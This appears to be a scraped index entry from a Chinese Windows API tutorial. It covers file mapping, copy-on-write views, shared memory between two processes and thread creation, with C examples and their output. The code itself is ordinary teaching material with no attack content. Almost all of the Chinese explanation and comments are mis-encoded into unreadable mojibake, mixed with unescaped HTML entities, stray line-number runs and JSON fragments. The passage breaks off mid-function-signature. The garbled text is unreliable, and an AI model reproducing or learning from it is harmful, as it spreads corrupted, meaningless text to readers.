æ‰“å¼€æ–‡ä»¶ hFile = CreateFile( lpcFile, // æ–‡ä»¶è·¯å¾„ GENERIC_READ | GENERIC_WRITE, // è®¿é—®æ¨¡å¼ï¼šè¯»å†™ 0, // å…±äº«æ¨¡å¼ï¼šä¸å…±äº« NULL, // å®‰å…¨å±æ€§ï¼šé»˜è®¤ OPEN_EXISTING, // æ‰“å¼€ç°æœ‰çš„æ–‡ä»¶ FILE_ATTRIBUTE_NORMAL, // æ–‡ä»¶å±æ€§ï¼šæ™®é€šæ–‡ä»¶ NULL // æ¨¡æ¿æ–‡ä»¶å¥æŸ„ï¼šä¸ä½¿ç”¨ ); // åˆ¤æ–­CreateFileæ˜¯å¦æ‰§è¡ŒæˆåŠŸ if (hFile == INVALID_HANDLE_VALUE) &#123; printf(&quot;CreateFile failed: %d &quot;, GetLastError()); return 1; // æ›´æ­£è¿”å›å€¼ï¼Œé€šå¸¸åœ¨é”™è¯¯æ—¶è¿”å›éé›¶å€¼ &#125; // åˆ›å»ºæ–‡ä»¶æ˜ å°„å¯¹è±¡ hMapFile = CreateFileMapping( hFile, // æ–‡ä»¶å¥æŸ„ NULL, // é»˜è®¤å®‰å…¨çº§åˆ« PAGE_READWRITE, // å¯è¯»å¯å†™ä¿æŠ¤ 0, // æ˜ å°„å¯¹è±¡çš„å¤§å°çš„é«˜32ä½ 0, // æ˜ å°„å¯¹è±¡çš„å¤§å°çš„ä½32ä½ï¼Œ0è¡¨ç¤ºæ˜ å°„æ•´ä¸ªæ–‡ä»¶ &quot;SharedMemoryA&quot; // æ˜ å°„å¯¹è±¡çš„åå­— ); // åˆ¤æ–­CreateFileMappingæ˜¯å¦æ‰§è¡ŒæˆåŠŸ if (hMapFile == NULL) &#123; printf(&quot;CreateFileMapping failed: %d &quot;, GetLastError()); CloseHandle(hFile); // å¦‚æœå¤±è´¥ï¼Œå…³é—­æ–‡ä»¶å¥æŸ„ return 1; &#125; // å°†æ–‡ä»¶æ•°æ®æ˜ å°„åˆ°è¿›ç¨‹çš„åœ°å€ç©ºé—´ lpAddr = MapViewOfFile( hMapFile, // æ–‡ä»¶æ˜ å°„å¯¹è±¡å¥æŸ„+ FILE_MAP_COPY, // å†™æ‹·è´ 0, // æ–‡ä»¶æ•°æ®çš„èµ·å§‹åç§»é‡çš„é«˜32ä½ 0, // æ–‡ä»¶æ•°æ®çš„èµ·å§‹åç§»é‡çš„ä½32ä½ 0 // æ˜ å°„è§†å›¾çš„å¤§å°ï¼Œ0è¡¨ç¤ºä»åç§»é‡åˆ°æ–‡ä»¶æœ«å°¾ ); // åˆ¤æ–­MapViewOfFileæ˜¯å¦æ‰§è¡ŒæˆåŠŸ if (lpAddr == NULL) &#123; printf(&quot;MapViewOfFile failed: %d &quot;, GetLastError()); CloseHandle(hMapFile); // å¦‚æœå¤±è´¥ï¼Œå…³é—­æ˜ å°„å¯¹è±¡å¥æŸ„ CloseHandle(hFile); // å…³é—­æ–‡ä»¶å¥æŸ„ return 1; &#125; // è¯»å–æ˜ å°„è§†å›¾çš„æœ€å¼€å§‹çš„4ä¸ªå­—èŠ‚ DWORD dwTest1 = *(LPDWORD)lpAddr; // å°†lpAddrå¼ºåˆ¶è½¬æ¢ä¸ºLPDWORDç„¶åè§£å¼•ç”¨è·å–DWORDå€¼ printf(&quot;First 4 bytes of the file in hexadecimal: %08x &quot;, dwTest1); // ä¿®æ”¹æœ€å¼€å§‹çš„4ä¸ªå­—èŠ‚ä¸ºå­—ç¬¦ &#x27;A&#x27; memset(lpAddr, &#x27;A&#x27;, 4); // è¯»å–å¹¶æ‰“å°ä¿®æ”¹åçš„4ä¸ªå­—èŠ‚ dwTest1 = *(LPDWORD)lpAddr; printf(&quot;First 4 bytes of the file in hexadecimal after change: %08x &quot;, dwTest1); getchar(); //é˜»å¡ï¼Œä¾¿äºè§‚å¯Ÿ // æ¸…ç†èµ„æº UnmapViewOfFile(lpAddr); // å–æ¶ˆæ˜ å°„ CloseHandle(hMapFile); // å…³é—­æ–‡ä»¶æ˜ å°„å¯¹è±¡çš„å¥æŸ„ CloseHandle(hFile); // å…³é—­æ–‡ä»¶çš„å¥æŸ„ return 0;&#125;1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main()&#123; HANDLE hMapFile; LPVOID lpAddr; // æ‰“å¼€ç°æœ‰çš„æ–‡ä»¶æ˜ å°„å¯¹è±¡ hMapFile = OpenFileMapping( FILE_MAP_ALL_ACCESS, // è¯·æ±‚è¯»å†™è®¿é—®æƒ FALSE, // ç»§æ‰¿å¥æŸ„ï¼šä¸ç»§æ‰¿ &quot;SharedMemoryA&quot; // æ–‡ä»¶æ˜ å°„å¯¹è±¡çš„åå­— ); // åˆ¤æ–­OpenFileMappingæ˜¯å¦æ‰§è¡ŒæˆåŠŸ if (hMapFile == NULL) &#123; printf(&quot;OpenFileMapping failed: %d &quot;, GetLastError()); return 1; &#125; // å°†æ–‡ä»¶æ˜ å°„å¯¹è±¡æ˜ å°„åˆ°è¿›ç¨‹çš„åœ°å€ç©ºé—´ lpAddr = MapViewOfFile( hMapFile, // æ–‡ä»¶æ˜ å°„å¯¹è±¡å¥æŸ„+ FILE_MAP_COPY, // å†™æ‹·è´ 0, // æ–‡ä»¶æ•°æ®çš„èµ·å§‹åç§»é‡çš„é«˜32ä½ 0, // æ–‡ä»¶æ•°æ®çš„èµ·å§‹åç§»é‡çš„ä½32ä½ 0 // æ˜ å°„è§†å›¾çš„å¤§å°ï¼Œ0è¡¨ç¤ºä»åç§»é‡åˆ°æ–‡ä»¶æœ«å°¾ ); // åˆ¤æ–­MapViewOfFileæ˜¯å¦æ‰§è¡ŒæˆåŠŸ if (lpAddr == NULL) &#123; printf(&quot;MapViewOfFile failed: %d &quot;, GetLastError()); CloseHandle(hMapFile); // å¦‚æœå¤±è´¥ï¼Œå…³é—­æ˜ å°„å¯¹è±¡å¥æŸ„ return 1; &#125; // è¯»å–æ˜ å°„è§†å›¾çš„æœ€å¼€å§‹çš„4ä¸ªå­—èŠ‚ DWORD dwTest1 = *(LPDWORD)lpAddr; // å°†lpAddrå¼ºåˆ¶è½¬æ¢ä¸ºLPDWORDç„¶åè§£å¼•ç”¨è·å–DWORDå€¼ printf(&quot;First 4 bytes of the shared memory in hexadecimal: %08x &quot;, dwTest1); printf(&quot;Process B read&quot;); getchar(); // æ¸…ç†èµ„æº UnmapViewOfFile(lpAddr); // å–æ¶ˆæ˜ å°„ CloseHandle(hMapFile); // å…³é—­æ–‡ä»¶æ˜ å°„å¯¹è±¡çš„å¥æŸ„ return 0;&#125;è®°äº‹æœ¬A.txtè¿è¡Œå‰10000000000000000000è¿è¡Œç¨‹åºAï¼Œä¿®æ”¹A.txtï¼Œç„¶åé˜»å¡åœ¨getchar()ç¨‹åºAè¾“å‡º123First 4 bytes of the file in hexadecimal: 30303030First 4 bytes of the file in hexadecimal after change: 41414141éšåè¿è¡Œç¨‹åºBï¼Œçœ‹èƒ½å¦è¯»å‡ºè¿›ç¨‹Aå¯¹å…±äº«ç‰©ç†é¡µçš„ä¿®æ”¹ç¨‹åºBè¾“å‡º12First 4 bytes of the shared memory in hexadecimal: 30303030Process B readè¯´æ˜Aè¿›ç¨‹å¯¹ç‰©ç†é¡µçš„ä¿®æ”¹æ˜¯æ–°çš„å‰¯æœ¬çš„ä¿®æ”¹ï¼Œæ²¡å½±å“åˆ°åŸå§‹çš„ç‰©ç†é¡µã€‚Bè¿›ç¨‹è¯»çš„è¿˜æ˜¯åŸå§‹çš„ç‰©ç†é¡µçš„å†…å®¹ä¸¤ä¸ªè¿›ç¨‹éƒ½ç»“æŸåï¼ŒA.txtçš„å†…å®¹æœªè¢«ä¿®æ”¹ï¼Œè¿˜æ˜¯ï¼šä¸¤ä¸ªç¨‹åºéƒ½ç»“æŸåçš„è®°äº‹æœ¬A.txt10000000000000000000"},{"title":"å…±äº«å†…å­˜çš„ç”³è¯·å’Œé‡Šæ”¾","path":"/wiki/Windows_API/å…±äº«å†…å­˜çš„ç”³è¯·å’Œé‡Šæ”¾.html","content":"CreateFileMappingW CreateFileMappingç”¨äºåˆ›å»ºä¸€ä¸ªæ–‡ä»¶æ˜ å°„ï¼ˆFile mappingï¼‰å†…æ ¸å¯¹è±¡ï¼Œè¯¥å†…æ ¸å¯¹è±¡ä¸ºå¼€å‘è€…å‡†å¤‡ä¸€å—å¯ç”¨äºæ˜ å°„çš„ç‰©ç†å†…å­˜ 12345678HANDLE CreateFileMappingW( [in] HANDLE hFile, // handle to file [in, optional] LPSECURITY_ATTRIBUTES lpFileMappingAttributes, // security å®‰å…¨æè¿°ç¬¦å±æ€§ [in] DWORD flProtect, // protection [in] DWORD dwMaximumSizeHigh, // high-order DWORD of size [in] DWORD dwMaximumSizeLow, // low-order DWORD of size [in, optional] LPCWSTR lpName // object name); hFile INVALID_HANDLE_VALUEï¼šå°±åªå‡†å¤‡ç‰©ç†å†…å­˜ï¼Œä¸ä¼šä¸æ–‡ä»¶è¿›è¡Œå…³è” ä¼ hFileè¿™ä¸ªå‚æ•°ï¼Œä¸ä½†å‡†å¤‡ç‰©ç†é¡µï¼Œè¿˜ä¼šå°†è¿™ä¸ªæ–‡ä»¶æ˜ å°„åˆ°ç‰©ç†é¡µä¸Š lpFileMappingAttributesï¼šå®‰å…¨æè¿°ç¬¦å±æ€§ flProtectï¼šå‡†å¤‡çš„ç‰©ç†å†…å­˜æ˜¯ä»€ä¹ˆå±æ€§ PAGE_READONLYï¼šåªè¯» PAGE_READWRITEï¼šå¯è¯»å¯å†™ PAGE_WRITECOPYï¼šå†™æ‹·è´ dwMaximumSizeHighå’ŒdwMaximumSizeLowç”¨äºæŒ‡å®šè¦å¤šå¤§ä¸€å—ç‰©ç†å†…å­˜ dwMaximumSizeHighæ˜¯é«˜32ä½ dwMaximumSizeLowæ˜¯ä½32ä½ dwMaximumSizeHighï¼šThe high-order DWORD of the maximum size of the file mapping object.é«˜32ä½çš„å€¼ã€‚ åœ¨32ä½ç³»ç»Ÿä¸­è®¾ç½®ä¸ºç©ºï¼Œå› ä¸º32ä½ç³»ç»Ÿåªæœ‰32ä½ï¼Œç”¨dwMaximumSizeLowæ¥æŒ‡å®šã€‚ dwMaximumSizeLowï¼šThe low-order DWORD of the maximum size of the file mapping object.ä½32ä½çš„å€¼ã€‚ lpNameï¼šè¯¥å†…æ ¸å¯¹è±¡çš„åå­—ã€‚ å¤šè¿›ç¨‹è¦ç”¨åˆ°è¯¥å†…æ ¸å¯¹è±¡ï¼Œå°±è¦èµ·åå­— åªæ˜¯è‡ªå·±è¿›ç¨‹ä¸­ç”¨åˆ°ï¼Œå¯ä»¥æ˜¯åŒ¿åå¯¹è±¡ è°ƒç”¨CreateFileMappingåï¼Œç‰©ç†é¡µå·²å‡†å¤‡å¥½ï¼Œä½†æ˜¯è¿™äº›ç‰©ç†é¡µå’Œè¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´æ²¡å…³è”ï¼Œè¦ç”¨MapViewOfFileå‡½æ•°å»ºç«‹ç‰©ç†é¡µä¸è¿›ç¨‹è™šæ‹Ÿåœ°å€ç©ºé—´ä¹‹é—´çš„æ˜ å°„ï¼Œéšåè¿›ç¨‹å°±å¯ä»¥é€šè¿‡è™šæ‹Ÿåœ°å€æ¥è®¿é—®è¯¥ç‰©ç†é¡µï¼ˆå¦‚æœåˆ›å»ºç‰©ç†é¡µæ—¶æœ‰æ˜ å°„æ–‡ä»¶ï¼Œé‚£è®¿é—®è¯¥ç‰©ç†é¡µå°±æ˜¯è®¿é—®æ˜ å°„çš„æ–‡ä»¶å†…å®¹ï¼‰ã€‚ MapViewOfFile Maps a view of a file mapping into the address space of a calling process. å°†ç‰©ç†é¡µä¸è¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´åšå…³è” 1234567LPVOID MapViewOfFile( [in] HANDLE hFileMappingObject, // handle to file-mapping object file-mapping [in] DWORD dwDesiredAccess, // access mode [in] DWORD dwFileOffsetHigh, // high-order DWORD of offset [in] DWORD dwFileOffsetLow, // low-order DWORD of offset [in] SIZE_T dwNumberOfBytesToMap // number of bytes to map); hFileMappingObjectï¼šè¦æ˜ å°„çš„FileMappingå¯¹è±¡çš„å¥æŸ„ dwDesiredAccessï¼šæŒ‡å®šè™šæ‹Ÿå†…å­˜çš„å±æ€§ çº¿æ€§åœ°å€å±æ€§çš„é™åˆ¶åªèƒ½æ¯”ç‰©ç†é¡µå±æ€§çš„é™åˆ¶æ›´ä¸¥æ ¼ï¼Œä¸èƒ½æ›´å®½æ¾ ä¸Šé¢CreateFileMappingWå‡½æ•°å‚æ•°flProtectæŒ‡å®šçš„æ˜¯ç‰©ç†å†…å­˜çš„å±æ€§ã€‚ æ¯”å¦‚CreateFileMappingWåˆ›å»ºç‰©ç†é¡µæ—¶PAGE_READWRITEå¯è¯»å¯å†™ï¼ŒMapViewOfFileå»ºç«‹æ˜ å°„æ—¶æŒ‡å®šè™šæ‹Ÿåœ°å€FILE_MAP_READåªè¯» ä½†è¿”è¿‡æ¥ä¸è¡Œï¼Œåˆ›å»ºç‰©ç†é¡µæ—¶åªè¯»ï¼ŒMapViewOfFileè¯´è™šæ‹Ÿå†…å­˜å¯è¯»å¯å†™ï¼Œè¿™æ ·MapViewOfFileä¼šæ‰§è¡Œå¤±è´¥ FILE_MAP_COPYï¼šå†™æ‹·è´ dwFileOffsetHighï¼šé«˜32ä½ã€‚A high-order DWORD of the file offset where the view begins. dwFileOffsetLowï¼šä½32ä½ã€‚A low-order DWORD of the file offset where the view is to begin. æ¯”å¦‚ä»ç‰©ç†é¡µ0åœ°å€å¼€å§‹æ˜ å°„ï¼Œæ˜ å°„dwNumberOfBytesToMapä¸ªå­—èŠ‚çš„å¤§å°ã€‚ dwNumberOfBytesToMapï¼šæ˜ å°„å¤šå¤§çš„å†…å­˜ã€‚The number of bytes of a file mapping to map to the view. All bytes must be within the maximum size specified by CreateFileMapping. If this parameter is 0 (zero), the mapping extends from the specified offset to the end of the file mapping. ä¾‹ å…±äº«å†…å­˜çš„ç”³è¯·å’Œé‡Šæ”¾ UnmapViewOfFile(g_lpBuff)å…³é—­æ˜ å°„ï¼Œçº¿æ€§åœ°å€æ²¡äº†ï¼Œç‰©ç†é¡µè¿˜åœ¨ CloseHandle(g_hMapFile)åªæ˜¯è®©æ–‡ä»¶æ˜ å°„å†…æ ¸å¯¹è±¡å¼•ç”¨è®¡æ•°å™¨å‡1ï¼Œåªæœ‰å½“è¯¥å†…æ ¸å¯¹è±¡è®¡æ•°å™¨ä¸º0æ—¶ï¼Œè¯¥ç‰©ç†é¡µæ‰ä¼šé‡Šæ”¾ 12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;windows.h&gt;#define MapFileName &quot;å…±äº«å†…å­˜&quot; // FileMappingå¯¹è±¡åç§°#define BUF_SIZE 0x1000 // åˆ†é…çš„å†…å­˜å¤§å°ï¼ˆ4KBï¼‰HANDLE g_hMapFile; // FileMappingå¯¹è±¡å¥æŸ„LPTSTR g_lpBuff; // æŒ‡å‘çº¿æ€§åœ°å€åŒºåŸŸçš„æŒ‡é’ˆint main(int argc, char* argv[])&#123; getchar(); // ç­‰å¾…ï¼Œç”¨äºè§‚å¯Ÿ // åˆ›å»ºæ–‡ä»¶æ˜ å°„å¯¹è±¡ g_hMapFile = CreateFileMapping( INVALID_HANDLE_VALUE, // åªå‡†å¤‡ç‰©ç†å†…å­˜ï¼Œä¸ä¼šä¸æ–‡ä»¶è¿›è¡Œå…³è” NULL, // é»˜è®¤å®‰å…¨æ€§ PAGE_READWRITE, // è¯»å†™æƒé™ 0, // ç‰©ç†é¡µå¤§å°-é«˜32ä½çš„å€¼ï¼ˆ0è¡¨ç¤ºä¸æŒ‡å®šï¼‰ BUF_SIZE, // ç‰©ç†é¡µå¤§å°-ä½32ä½çš„å€¼ MapFileName); // object name // å°†FileMappingå¯¹è±¡æ˜ å°„åˆ°è¿›ç¨‹çš„çº¿æ€§åœ°å€ç©ºé—´ g_lpBuff = (LPTSTR)MapViewOfFile( g_hMapFile, // FileMappingå¯¹è±¡å¥æŸ„ FILE_MAP_ALL_ACCESS, // å…è®¸è¯»å†™è®¿é—® 0, // é«˜32ä½åç§»é‡ 0, // ä½32ä½åç§»é‡ BUF_SIZE); // è™šæ‹Ÿå†…å­˜ç©ºé—´æ˜ å°„å¤§å° // åœ¨æ˜ å°„çš„è™šæ‹Ÿåœ°å€ç©ºé—´å†™å…¥æ•°æ® *(PDWORD)g_lpBuff = 0x12345678; printf(&quot;%p&quot;, g_lpBuff); getchar(); // ç­‰å¾…ï¼Œç”¨äºè§‚å¯Ÿ UnmapViewOfFile(g_lpBuff); // è§£é™¤æ˜ å°„ CloseHandle(g_hMapFile); // å…³é—­å¥æŸ„ getchar(); // ç­‰å¾…ï¼Œç”¨äºè§‚å¯Ÿ return 0;&#125; åˆ›å»ºå…±äº«å†…å­˜å‰åˆ›å»ºå…±äº«å†…å­˜+å»ºç«‹æ˜ å°„è§£é™¤æ˜ å°„å…³ç³»è¾“å‡º12003A0000 ç”³è¯·ç‰©ç†é¡µå¹¶å»ºç«‹æ˜ å°„åï¼Œå¤šäº†0x3a0-0x3a0é‚£è¡Œ commitä¸º0çš„åŸå› æ˜¯ï¼šMapViewOfFileå»ºç«‹äº†è¿™ç§æ˜ å°„ï¼Œæ“ä½œç³»ç»Ÿä¼šåœ¨ä½¿ç”¨è¿™å—è™šæ‹Ÿå†…å­˜æ—¶æŒ‚ä¸Šç‰©ç†é¡µ è§£é™¤æ˜ å°„å…³ç³»åï¼Œ0x3a0é‚£è¡Œæ²¡äº† å¤šè¿›ç¨‹ä½¿ç”¨å…±äº«å†…å­˜ CreateFileMappingä¸­çš„FileMappingå¯¹è±¡å¦‚æœå·²å­˜åœ¨ï¼ŒCreateFileMappingè¿”å›å·²å­˜åœ¨çš„è¿™ä¸ªFileMappingå¯¹è±¡çš„å¥æŸ„ã€‚ï¼ˆå’ŒCreateMutexç­‰apiä¸€æ ·ï¼‰ If the function succeeds, the return value is a handle to the newly created file mapping object. If the object exists before the function call, the function returns a handle to the existing object (with its current size, not the specified size), and GetLastError returns ERROR_ALREADY_EXISTS. è¿›ç¨‹Aå’Œè¿›ç¨‹Béƒ½ç”¨MapViewOfFileå»ºç«‹è‡ªå·±è™šæ‹Ÿç©ºé—´åœ°å€åˆ°åŒä¸€ç‰©ç†é¡µçš„æ˜ å°„ï¼Œè¿›ç¨‹Açš„èµ·å§‹è™šæ‹Ÿåœ°å€å’Œè¿›ç¨‹Bçš„èµ·å§‹è™šæ‹Ÿåœ°å€çš„å€¼æ²¡è”ç³»ã€‚å¯èƒ½è¿›ç¨‹Aæ˜¯ä»çº¿æ€§åœ°å€003A0000å¼€å§‹æ˜ å°„åˆ°ç‰©ç†é¡µï¼Œè¿›ç¨‹Bå¯èƒ½ä»003A0000æˆ–å…¶ä»–çº¿æ€§åœ°å€å¼€å§‹æ˜ å°„åˆ°ç‰©ç†é¡µ ç¨‹åºAç¨‹åºB123456789101112131415161718192021222324252627282930313233343536373839#include &lt;windows.h&gt;#define MapFileName &quot;å…±äº«å†…å­˜&quot; // FileMappingå¯¹è±¡åç§°#define BUF_SIZE 0x1000 // åˆ†é…çš„å†…å­˜å¤§å°ï¼ˆ4KBï¼‰HANDLE g_hMapFile; // FileMappingå¯¹è±¡å¥æŸ„LPTSTR g_lpBuff; // æŒ‡å‘çº¿æ€§åœ°å€åŒºåŸŸçš„æŒ‡é’ˆint main(int argc, char* argv[])&#123; // åˆ›å»ºæ–‡ä»¶æ˜ å°„å¯¹è±¡ g_hMapFile = CreateFileMapping( INVALID_HANDLE_VALUE, // åªå‡†å¤‡ç‰©ç†å†…å­˜ï¼Œä¸ä¼šä¸æ–‡ä»¶è¿›è¡Œå…³è” NULL, // é»˜è®¤å®‰å…¨æ€§ PAGE_READWRITE, // è¯»å†™æƒé™ 0, // ç‰©ç†é¡µå¤§å°-é«˜32ä½çš„å€¼ï¼ˆ0è¡¨ç¤ºä¸æŒ‡å®šï¼‰ BUF_SIZE, // ç‰©ç†é¡µå¤§å°-ä½32ä½çš„å€¼ MapFileName); // object name // å°†FileMappingå¯¹è±¡æ˜ å°„åˆ°è¿›ç¨‹çš„çº¿æ€§åœ°å€ç©ºé—´ g_lpBuff = (LPTSTR)MapViewOfFile( g_hMapFile, // FileMappingå¯¹è±¡å¥æŸ„ FILE_MAP_ALL_ACCESS, // å…è®¸è¯»å†™è®¿é—® 0, // é«˜32ä½åç§»é‡ 0, // ä½32ä½åç§»é‡ BUF_SIZE); // è™šæ‹Ÿå†…å­˜ç©ºé—´æ˜ å°„å¤§å° *(PDWORD)g_lpBuff = 0x12345678; // åœ¨æ˜ å°„çš„è™šæ‹Ÿåœ°å€ç©ºé—´å†™å…¥æ•°æ® printf(&quot;å·²åˆ›å»ºç‰©ç†é¡µï¼Œè¿›ç¨‹Açš„çº¿æ€§åœ°å€æ˜¯ï¼š%p &quot;, g_lpBuff); printf(&quot;å·²å¾€ç‰©ç†é¡µå†™å…¥çš„å€¼ï¼š0x%x &quot;, *(PDWORD)g_lpBuff); printf(&quot;è¯·è¿è¡Œç¨‹åºBè®¿é—®è¿™å—å…±äº«å†…å­˜ &quot;); getchar(); // ç­‰å¾…ï¼Œç”¨äºè§‚å¯Ÿ UnmapViewOfFile(g_lpBuff); // è§£é™¤æ˜ å°„ CloseHandle(g_hMapFile); // å…³é—­å¥æŸ„ return 0;&#125;123456789101112131415161718192021222324252627282930313233343536#include &lt;windows.h&gt;#define MapFileName &quot;å…±äº«å†…å­˜&quot; // FileMappingå¯¹è±¡åç§°#define BUF_SIZE 0x1000 // åˆ†é…çš„å†…å­˜å¤§å°ï¼ˆ4KBï¼‰HANDLE g_hMapFile; // FileMappingå¯¹è±¡å¥æŸ„LPTSTR g_lpBuff; // æŒ‡å‘çº¿æ€§åœ°å€åŒºåŸŸçš„æŒ‡é’ˆint main(int argc, char* argv[])&#123; // åˆ›å»ºæ–‡ä»¶æ˜ å°„å¯¹è±¡ g_hMapFile = CreateFileMapping( INVALID_HANDLE_VALUE, // åªå‡†å¤‡ç‰©ç†å†…å­˜ï¼Œä¸ä¼šä¸æ–‡ä»¶è¿›è¡Œå…³è” NULL, // é»˜è®¤å®‰å…¨æ€§ PAGE_READWRITE, // è¯»å†™æƒé™ 0, // ç‰©ç†é¡µå¤§å°-é«˜32ä½çš„å€¼ï¼ˆ0è¡¨ç¤ºä¸æŒ‡å®šï¼‰ BUF_SIZE, // ç‰©ç†é¡µå¤§å°-ä½32ä½çš„å€¼ MapFileName); // object name // å°†FileMappingå¯¹è±¡æ˜ å°„åˆ°è¿›ç¨‹çš„çº¿æ€§åœ°å€ç©ºé—´ g_lpBuff = (LPTSTR)MapViewOfFile( g_hMapFile, // FileMappingå¯¹è±¡å¥æŸ„ FILE_MAP_ALL_ACCESS, // å…è®¸è¯»å†™è®¿é—® 0, // é«˜32ä½åç§»é‡ 0, // ä½32ä½åç§»é‡ BUF_SIZE); // è™šæ‹Ÿå†…å­˜ç©ºé—´æ˜ å°„å¤§å° printf(&quot;å·²åˆ›å»ºç‰©ç†é¡µï¼Œè¿›ç¨‹Bçš„çº¿æ€§åœ°å€æ˜¯ï¼š%p &quot;, g_lpBuff); printf(&quot;è¿›ç¨‹Bè¯»å–åˆ°çš„å€¼ï¼š0x%x &quot;, *(PDWORD)g_lpBuff); getchar(); // ç­‰å¾…ï¼Œç”¨äºè§‚å¯Ÿ UnmapViewOfFile(g_lpBuff); // è§£é™¤æ˜ å°„ CloseHandle(g_hMapFile); // å…³é—­å¥æŸ„ return 0;&#125; å…ˆè¿è¡Œç¨‹åºAï¼Œç„¶åè¿è¡Œç¨‹åºB ç¨‹åºAç¨‹åºB"},{"title":"åˆ›å»ºçº¿ç¨‹","path":"/wiki/Windows_API/åˆ›å»ºçº¿ç¨‹.html","content":"ä»€ä¹ˆæ˜¯çº¿ç¨‹ è¿›ç¨‹æä¾›äº†ç¨‹åºè¿è¡Œæ‰€éœ€è¦çš„èµ„æºï¼Œè€Œçº¿ç¨‹æ˜¯é™„å±åœ¨è¿›ç¨‹ä¸Šçš„æ‰§è¡Œå®ä½“ï¼Œæ˜¯ä»£ç çš„æ‰§è¡Œæµç¨‹ã€‚è¿™ä¹Ÿæ˜¯é‡‘å¥â€œè¿›ç¨‹å°±æ˜¯4GBï¼Œçº¿ç¨‹å°±æ˜¯EIPâ€ï¼ˆè¿›ç¨‹æ˜¯4GBè™šæ‹Ÿç©ºé—´é‡Œçš„å†…å®¹ï¼Œçº¿ç¨‹æ˜¯å…·ä½“æ‰§è¡Œçš„ä»£ç ï¼‰å‡ºå¤„çš„ä¾æ®ã€‚ è¿›ç¨‹æ˜¯ç©ºé—´ä¸Šçš„æ¦‚å¿µï¼Œçº¿ç¨‹æ˜¯æ—¶é—´ä¸Šçš„æ¦‚å¿µã€‚å¦‚æœåªæœ‰è¿›ç¨‹ï¼Œè¿™ä¸ªç¨‹åºæ˜¯ä¸ä¼šåŠ¨çš„ã€‚ä¸€ä¸ªè¿›ç¨‹è‡³å°‘è¦æœ‰ä¸€ä¸ªçº¿ç¨‹ï¼Œè¿›ç¨‹åˆ›å»ºæ—¶æä¾›äº†ç¨‹åºè¿è¡Œæ—¶æ‰€éœ€è¦çš„èµ„æºï¼ˆåŒ…æ‹¬ä¸€ä¸ªçº¿ç¨‹ï¼‰ï¼Œä¾¿å¼€å§‹æ‰§è¡Œçº¿ç¨‹ï¼Œè¿™ä¸ªçº¿ç¨‹åˆç§°ä¸»çº¿ç¨‹ã€‚ä¸»çº¿ç¨‹å¯ä»¥åˆ›å»ºå…¶ä»–çº¿ç¨‹ã€‚ åœ¨Windowsä»»åŠ¡ç®¡ç†å™¨ä¸­å¯ä»¥çœ‹åˆ°æ¯ä¸ªè¿›ç¨‹å½“å‰çš„çº¿ç¨‹æ•°é‡ï¼Œçº¿ç¨‹æ•°ä¸º3ï¼Œè¡¨ç¤ºæœ‰3æ®µä»£ç åœ¨â€œåŒæ—¶æ‰§è¡Œâ€ã€‚åœ¨ç³»ç»Ÿä¸­ï¼ŒåŒæ—¶å­˜åœ¨çš„çº¿ç¨‹æ¯”CPUæ•°é‡å¤šã€‚ å¹¶ä¸ä¸€å®šæ˜¯â€œåŒæ—¶æ‰§è¡Œâ€ï¼Œå¦‚æœæ˜¯å•æ ¸CPUï¼ˆä¸€ä¸ªCPUåªæœ‰ä¸€å¥—å¯„å­˜å™¨ï¼Œä¸€ä¸ªCPUåœ¨åŒä¸€ä¸ªæ—¶é—´åªèƒ½æ‰§è¡Œä¸€æ¡æœºå™¨æŒ‡ä»¤ï¼‰ï¼Œè€Œæ¯ä¸ªçº¿ç¨‹éƒ½è¦æœ‰è‡ªå·±çš„æ ˆã€ä¸Šä¸‹æ–‡ï¼ˆcontextï¼ŒåŒ…æ‹¬CPUå¯„å­˜å™¨å€¼ç­‰ï¼‰ç­‰ã€‚å•æ ¸CPUä¸Šçš„å¤šçº¿ç¨‹æ˜¯é€šè¿‡æ—¶é—´ç‰‡åˆ‡æ¢æ¥å®Œæˆçš„ï¼Œè¿™ä¸ªæ—¶é—´ç‰‡æ‰§è¡ŒAçº¿ç¨‹ï¼Œä¸‹ä¸ªæ—¶é—´ç‰‡æ‰§è¡ŒBçº¿ç¨‹ï¼Œç”±äºåˆ‡æ¢æ—¶é—´çŸ­ï¼Œé¢‘ç‡é«˜ï¼Œç”¨æˆ·æ„Ÿè§‰ä¸åˆ°ï¼Œå½·ä½›å’Œå¤šæ ¸CPUæ²¡åŒºåˆ«ï¼Œå®é™…ä¸Šæ˜¯å®è§‚å¹¶è¡Œï¼Œå¾®è§‚ä¸²è¡Œã€‚å¦‚æœæ˜¯å¤šæ ¸CPUï¼Œå°±æœ‰å¤šå¥—å¯„å­˜å™¨ï¼Œæ¯ä¸ªæ ¸éƒ½èƒ½è·‘ä¸€ä¸ªçº¿ç¨‹ï¼Œè¿™æ‰æ˜¯çœŸæ­£æ„ä¹‰ä¸Šçš„å¤šçº¿ç¨‹ã€‚ ä¸»çº¿ç¨‹ ä¸€æ®µç¨‹åºä¸­å¦‚æœæ²¡æœ‰é¢å¤–åˆ›å»ºçº¿ç¨‹ï¼Œmainå‡½æ•°ä»£ç çš„æ‰§è¡Œæµç¨‹å°±æ˜¯ä¸€ä¸ªä¸»çº¿ç¨‹ã€‚ä¸‹é¢è¿™æ®µä»£ç åœ¨ä»»åŠ¡ç®¡ç†å™¨ä¸­å¯ä»¥çœ‹åˆ°çº¿ç¨‹æ•°æ˜¯1ã€‚ 12345678910111213#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main(int argc, char* argv[])&#123; // è¦æ‰§è¡Œçš„ä»£ç  for (int i = 0; i &lt; 100; i++) &#123; Sleep(500); printf(&quot;------ %d &quot;, i); &#125; return 0;&#125; åˆ›å»ºçº¿ç¨‹ CreateThreadå‡½æ•° éœ€è¦å¢åŠ çº¿ç¨‹ï¼Œä½¿ç”¨CreateThreadå‡½æ•° 12345678HANDLE CreateThread( // è¿”å›çº¿ç¨‹çš„å¥æŸ„ [in, optional] LPSECURITY_ATTRIBUTES lpThreadAttributes, // SD å®‰å…¨å±æ€§ï¼ŒåŒ…å«å®‰å…¨æè¿°ç¬¦ [in] SIZE_T dwStackSize, // initial stack size åˆå§‹å †æ ˆå¤§å° [in] LPTHREAD_START_ROUTINE lpStartAddress, // thread function çº¿ç¨‹æ‰§è¡Œçš„å‡½æ•°ä»£ç  [in, optional] __drv_aliasesMem LPVOID lpParameter, // thread argument 